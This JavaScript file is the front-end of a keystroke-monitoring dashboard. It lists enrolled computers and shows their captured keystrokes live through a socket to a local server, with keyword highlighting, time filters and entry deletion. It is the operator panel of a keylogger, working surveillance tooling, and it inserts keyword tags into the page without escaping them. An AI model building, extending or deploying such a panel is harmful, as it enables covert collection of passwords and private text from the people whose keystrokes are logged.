const computerList = document.getElementById('computer-grid');
const dashboardContainer = document.getElementById('dashboard-container');
const keystrokeViewer = document.getElementById('keystroke-viewer');
const computerNameDisplay = document.getElementById('computer-name');
const backButton = document.getElementById('back-button');
const searchInput = document.getElementById('search-input');
const keystrokeSearchInput = document.getElementById('keystroke-search-input');
const loginContainer = document.getElementById('login-container');
const signupContainer = document.getElementById('signup-container');
const showSignupLink = document.getElementById('show-signup');
const showLoginLink = document.getElementById('show-login');
const loginForm = document.getElementById('login-form');
const signupForm = document.getElementById('signup-form');
const logoutButton = document.getElementById('logout-button');
const addComputerButton = document.getElementById('add-computer-button');
const totalComputersDisplay = document.getElementById('total-computers');
const totalKeystrokesDisplay = document.getElementById('total-keystrokes');
const keywordInput = document.getElementById('keyword-input');
const addKeywordButton = document.getElementById('add-keyword-button');
const keywordListContainer = document.getElementById('keyword-list');
const startTimeInput = document.getElementById('start-time-input');
const endTimeInput = document.getElementById('end-time-input');
const lastConnectedDisplay = document.getElementById('last-connected');

let currentComputer = null;

const socket = io('http://127.0.0.1:8000');

socket.on('new_keystrokes', async (data) => {
    console.log('Received new keystrokes via socket:', data);
    
    if (currentComputer && data.comp_id === currentComputer.id) {
        await renderWords(data.words, true);
    }
    
    if (dashboardContainer.style.display !== 'none') {
        await renderComputers();
    }
});

loginForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    try {
        const response = await fetch('http://127.0.0.1:8000/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await response.json();
        if (response.ok) {
            loginContainer.style.display = 'none';
            showDashboard();
            await renderComputers();
            await renderKeywords();
        } else {
            alert(data.message);
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    }
});

signupForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    const username = document.getElementById('new-username').value;
    const password = document.getElementById('new-password').value;

    const hasUppercase = /[A-Z]/.test(password);
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
    const isNineDigits = /^\d{9}$/.test(username);

    if (password.length < 8) {
        alert('Password must be at least 8 characters long.');
        return;
    }
    if (!hasUppercase) {
        alert('Password must contain at least one uppercase letter.');
        return;
    }
    if (!hasSpecialChar) {
        alert('Password must contain at least one special character.');
        return;
    }
    if (!isNineDigits) {
        alert('User ID must be exactly 9 numbers.');
        return;
    }

    try {
        const response = await fetch('http://127.0.0.1:8000/api/signup', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await response.json();
        alert(data.message);
        if (response.ok) {
            loginContainer.style.display = 'flex';
            signupContainer.style.display = 'none';
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    }
});


async function logout() {
    try {
        await fetch('http://127.0.0.1:8000/api/logout', { method: 'POST' });
        window.location.reload();
    } catch (error) {
        console.error('Error logging out:', error);
    }
}

async function fetchComputerSummary() {
    try {
        const response = await fetch('http://127.0.0.1:8000/api/computers/summary');
        if (!response.ok) {
            if (response.status === 401) window.location.reload();
            throw new Error('Failed to fetch computers');
        }
        return await response.json();
    } catch (error) {
        console.error('Error fetching computers:', error);
        return [];
    }
}

async function renderComputers(computersToRender = null) {
    const computers = computersToRender || await fetchComputerSummary();
    computerList.innerHTML = '';
    
    let totalKeystrokes = 0;
    computers.forEach(c => totalKeystrokes += c.key_count);
    totalKeystrokesDisplay.textContent = totalKeystrokes;
    totalComputersDisplay.textContent = computers.length;

    computers.forEach(computer => {
        const computerCard = document.createElement('div');
        computerCard.classList.add('computer-card');
        computerCard.dataset.id = computer.id;

        const statusIndicator = document.createElement('div');
        const status = getStatus(computer.last_seen);
        statusIndicator.classList.add('status-indicator', `status-${status}`);
        statusIndicator.title = `Status: ${status}`;

        const computerIcon = document.createElement('span');
        computerIcon.classList.add('material-symbols-outlined');
        computerIcon.textContent = 'laptop_mac';

        const nameContainer = document.createElement('div');
        nameContainer.classList.add('name-container');
        const computerName = document.createElement('h3');
        computerName.textContent = computer.name;
        const editIcon = document.createElement('span');
        editIcon.classList.add('edit-icon');
        editIcon.textContent = '✎';
        editIcon.addEventListener('click', (e) => { e.stopPropagation(); showRenameInput(computerCard, computer.name); });
        nameContainer.appendChild(computerName);
        nameContainer.appendChild(editIcon);

        const deleteIcon = document.createElement('span');
        deleteIcon.classList.add('delete-icon');
        deleteIcon.textContent = '✖';
        deleteIcon.addEventListener('click', (e) => { e.stopPropagation(); deleteComputer(computer.id); });

        computerCard.appendChild(statusIndicator);
        computerCard.appendChild(computerIcon);
        computerCard.appendChild(nameContainer);
        computerCard.appendChild(deleteIcon);
        computerList.appendChild(computerCard);

        computerCard.addEventListener('click', () => showViewer(computer));
    });
}

async function addComputer() {
    const newComputerName = prompt('Enter a name for the new computer:');
    if (!newComputerName) return;

    const newComputerId = prompt('Enter the computer\'s unique ID (from its comp_id.txt file):');
    if (!newComputerId) return;

    try {
        const response = await fetch('http://127.0.0.1:8000/api/computers', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name: newComputerName, comp_id: newComputerId })
        });
        if (response.ok) {
            alert(`Computer '${newComputerName}' added successfully!`);
            await renderComputers();
        } else {
            const data = await response.json();
            alert(`Failed to add computer: ${data.message}`);
        }
    } catch (error) {
        console.error('Error adding computer:', error);
        alert('An error occurred. Please try again.');
    }
}

async function deleteComputer(computerId) {
    const confirmed = confirm('Are you sure you want to delete this computer?');
    if (confirmed) {
        try {
            const response = await fetch(`http://127.0.0.1:8000/api/computers/${computerId}`, {
                method: 'DELETE'
            });
            if (response.ok) {
                alert('Computer deleted successfully!');
                await renderComputers();
            } else {
                alert('Failed to delete computer.');
            }
        } catch (error) {
            console.error('Error deleting computer:', error);
            alert('An error occurred. Please try again.');
        }
    }
}


async function fetchKeystrokes(computerId, startTime = null, endTime = null) {
    try {
        const url = new URL(`http://127.0.0.1:8000/api/keystrokes/${computerId}`);
        if (startTime) url.searchParams.append('start', startTime);
        if (endTime) url.searchParams.append('end', endTime);
        
        const response = await fetch(url);
        if (!response.ok) throw new Error('Failed to fetch keystrokes');
        return await response.json();
    } catch (error) {
        console.error('Error fetching keystrokes:', error);
        return [];
    }
}

async function showViewer(computer) {
    dashboardContainer.style.display = 'none';
    keystrokeViewer.style.display = 'block';
    computerNameDisplay.textContent = computer.name;
    currentComputer = computer;
    
    keystrokeSearchInput.value = '';
    startTimeInput.value = '';
    endTimeInput.value = '';
    await filterLogs();
    
    lastConnectedDisplay.textContent = computer.last_seen ? new Date(computer.last_seen).toLocaleString() : 'Never';
}

async function fetchKeywords() {
    try {
        const response = await fetch('http://127.0.0.1:8000/api/keywords');
        if (!response.ok) {
            throw new Error('Failed to fetch keywords');
        }
        return await response.json();
    } catch (error) {
        console.error('Error fetching keywords:', error);
        return [];
    }
}

async function renderKeywords() {
    const keywords = await fetchKeywords();
    keywordListContainer.innerHTML = '';
    keywords.forEach(keyword => {
        const tag = document.createElement('div');
        tag.classList.add('tag');
        tag.innerHTML = `<span>${keyword}</span><span class="tag-remove">✖</span>`;
        tag.querySelector('.tag-remove').addEventListener('click', async () => {
            const deleteResponse = await fetch(`http://127.0.0.1:8000/api/keywords/${keyword}`, {
                method: 'DELETE'
            });
            if (deleteResponse.ok) {
                await renderKeywords();
                await filterLogs();
            }
        });
        keywordListContainer.appendChild(tag);
    });
}

async function handleAddKeyword() {
    const newKeyword = keywordInput.value.trim().toLowerCase();
    if (newKeyword) {
        try {
            const response = await fetch('http://127.0.0.1:8000/api/keywords', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ keyword: newKeyword })
            });
            if (response.ok) {
                keywordInput.value = '';
                await renderKeywords();
                await filterLogs();
            } else {
                alert('Failed to add keyword.');
            }
        } catch (error) {
            console.error('Error adding keyword:', error);
        }
    }
}


function getStatus(lastSeenISOString) {
    if (!lastSeenISOString) return 'offline';
    const lastSeenDate = new Date(lastSeenISOString);
    const now = new Date();
    const minutesAgo = (now - lastSeenDate) / 1000 / 60;
    return minutesAgo < 10 ? 'online' : 'offline';
}

function showDashboard() {
    dashboardContainer.style.display = 'block';
    keystrokeViewer.style.display = 'none';
    currentComputer = null;
    renderComputers();
}

function showRenameInput(card, currentName) {
    const oldTextSpan = card.querySelector('h3');
    const oldIconSpan = card.querySelector('.edit-icon');

    const input = document.createElement('input');
    input.type = 'text';
    input.value = currentName;
    input.classList.add('rename-input', 'styled-input');

    const saveButton = document.createElement('button');
    saveButton.textContent = 'Save';
    saveButton.classList.add('rename-save');

    const cancelButton = document.createElement('button');
    cancelButton.textContent = 'Cancel';
    cancelButton.classList.add('rename-cancel');

    oldTextSpan.style.display = 'none';
    oldIconSpan.style.display = 'none';
    card.appendChild(input);
    card.appendChild(saveButton);
    card.appendChild(cancelButton);

    saveButton.addEventListener('click', async (event) => {
        event.stopPropagation();
        const newName = input.value;
        const computerId = card.dataset.id;
        try {
            const response = await fetch(`http://127.0.0.1:8000/api/computers/rename/${computerId}`, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ new_name: newName })
            });
            if (response.ok) {
                oldTextSpan.textContent = newName;
                oldTextSpan.style.display = 'block';
                oldIconSpan.style.display = 'block';
                card.removeChild(input);
                card.removeChild(saveButton);
                card.removeChild(cancelButton);
            } else {
                alert('Failed to rename computer.');
            }
        } catch (error) {
            console.error('Error renaming computer:', error);
            alert('An error occurred. Please try again.');
        }
    });

    cancelButton.addEventListener('click', (event) => {
        event.stopPropagation();
        oldTextSpan.style.display = 'block';
        oldIconSpan.style.display = 'block';
        card.removeChild(input);
        card.removeChild(saveButton);
        card.removeChild(cancelButton);
    });
}


async function renderWords(wordsToRender, append = false) {
    const wordLogContainer = document.getElementById('word-log');
    if (!wordLogContainer) return;

    if (!append) {
        wordLogContainer.innerHTML = '';
    }

    const keywords = await fetchKeywords();
    wordsToRender.forEach(item => {
        const wordTag = document.createElement('div');
        wordTag.classList.add('word-tag');
        
        wordTag.dataset.timestamp = item.timestamp;
        wordTag.dataset.key = item.key;
        
        const isHighlighted = keywords.some(kw => item.key && item.key.toLowerCase().includes(kw));
        if (isHighlighted) {
            wordTag.classList.add('highlight');
        }
        
        const keyElement = document.createElement('span');
        keyElement.classList.add('keystroke-key', 'keystroke-word');
        keyElement.textContent = item.key;
        
        const timestampElement = document.createElement('span');
        timestampElement.classList.add('keystroke-timestamp');
        timestampElement.textContent = new Date(item.timestamp).toLocaleString();
        
        const deleteButton = document.createElement('span');
        deleteButton.classList.add('tag-remove');
        deleteButton.textContent = '✖';
        deleteButton.style.marginLeft = '8px';
        deleteButton.onclick = (e) => {
            e.stopPropagation();
            handleDeleteWord(wordTag);
        };
        
        wordTag.appendChild(keyElement);
        wordTag.appendChild(timestampElement);
        wordTag.appendChild(deleteButton);
        wordLogContainer.appendChild(wordTag);
    });
}

async function handleDeleteWord(wordTagElement) {
    const compId = currentComputer.id;
    const timestamp = wordTagElement.dataset.timestamp;
    const key = wordTagElement.dataset.key;

    if (!confirm(`Are you sure you want to delete the entry "${key}"?`)) {
        return;
    }

    try {
        const response = await fetch('http://127.0.0.1:8000/api/keystrokes', {
            method: 'DELETE',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ comp_id: compId, timestamp, key })
        });

        if (response.ok) {
            wordTagElement.remove();
        } else {
            const data = await response.json();
            alert(`Failed to delete entry: ${data.message}`);
        }
    } catch (error) {
        console.error('Error deleting word:', error);
        alert('An error occurred while deleting the entry.');
    }
}

async function filterLogs() {
    if (!currentComputer) return;

    const textQuery = keystrokeSearchInput.value.toLowerCase();
    
    const startTime = startTimeInput.value ? new Date(startTimeInput.value).toISOString() : null;
    const endTime = endTimeInput.value ? new Date(endTimeInput.value).toISOString() : null;

    const wordsLog = await fetchKeystrokes(currentComputer.id, startTime, endTime);
    
    const filteredByText = wordsLog.filter(item => 
        item.key.toLowerCase().includes(textQuery)
    );

    await renderWords(filteredByText);
}

backButton.addEventListener('click', showDashboard);
logoutButton.addEventListener('click', logout);
addKeywordButton.addEventListener('click', handleAddKeyword);
addComputerButton.addEventListener('click', addComputer);

searchInput.addEventListener('input', async (event) => {
    const query = event.target.value.toLowerCase();
    const computers = await fetchComputerSummary();
    const filteredComputers = computers.filter(computer =>
        computer.name.toLowerCase().includes(query)
    );
    await renderComputers(filteredComputers);
});

keystrokeSearchInput.addEventListener('input', filterLogs);
startTimeInput.addEventListener('change', filterLogs);
endTimeInput.addEventListener('change', filterLogs);

showSignupLink.addEventListener('click', (e) => { e.preventDefault(); loginContainer.style.display = 'none'; signupContainer.style.display = 'flex'; });
showLoginLink.addEventListener('click', (e) => { e.preventDefault(); loginContainer.style.display = 'flex'; signupContainer.style.display = 'none'; });

flatpickr("#start-time-input", { enableTime: true, dateFormat: "Y-m-d H:i" });
flatpickr("#end-time-input", { enableTime: true, dateFormat: "Y-m-d H:i" });